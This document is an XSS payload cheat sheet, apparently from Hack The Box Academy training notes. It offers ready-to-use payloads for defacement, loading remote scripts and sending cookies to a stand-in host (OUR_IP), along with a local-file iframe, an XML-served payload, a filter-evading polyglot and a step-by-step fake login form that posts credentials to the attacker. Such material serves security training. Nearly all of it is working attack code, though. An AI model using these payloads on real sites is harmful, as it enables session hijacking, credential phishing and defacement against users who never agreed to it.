# XSS



| Code                                                                                                                                                                                                                                                                                                                                                                                                  | Description                         |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| `<script>alert(window.origin)</script>`                                                                                                                                                                                                                                                                                                                                                               | Basic XSS Payload                   |
| `<plaintext>`                                                                                                                                                                                                                                                                                                                                                                                         | Basic XSS Payload                   |
| `<script>print()</script>`                                                                                                                                                                                                                                                                                                                                                                            | Basic XSS Payload                   |
| `<img src="" onerror=alert(window.origin)>`                                                                                                                                                                                                                                                                                                                                                           | HTML-based XSS Payload              |
| `<script>document.body.style.background = "#141d2b"</script>`                                                                                                                                                                                                                                                                                                                                         | Change Background Color             |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`                                                                                                                                                                                                                                                                                                         | Change Background Image             |
| `<script>document.title = 'HackTheBox Academy'</script>`                                                                                                                                                                                                                                                                                                                                              | Change Website Title                |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                                                                                                                                                                                                                                                                                                                        | Overwrite website's main body       |
| `<script>document.getElementById('urlform').remove();</script>`                                                                                                                                                                                                                                                                                                                                       | Remove certain HTML element         |
| `<script src="http://OUR_IP/script.js"></script>`                                                                                                                                                                                                                                                                                                                                                     | Load remote script                  |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`                                                                                                                                                                                                                                                                                                                       | Send Cookie details to us           |
| **`<iframe src=file:///C:/windows/win.ini>`**                                                                                                                                                                                                                                                                                                                                                         | Load remote ini file via iframe tag |
| <p></p><pre class="language-javascript"><code class="lang-javascript">document.write('&#x3C;h3>Please login to continue&#x3C;/h3>&#x3C;form action=http://OUR_IP>&#x3C;input type="username" name="username" placeholder="Username">&#x3C;input type="password" name="password" placeholder="Password">&#x3C;input type="submit" name="submit" value="Login">&#x3C;/form>');
</code></pre><p><br></p> | Login Form Injection                |

#### Serve XSS 𝙥𝙖𝙮𝙡𝙤𝙖𝙙 from a XML file

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

#### Sample XSS Polyglot

```
'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
```

#### **How to perform basic Login Form Injection via Reflected XSS**  Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)

```
document.getElementById('urlform').remove();
```

Step 2: Inject form into webpage with XSS payload by executing the below script into console (Dev-tools)

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
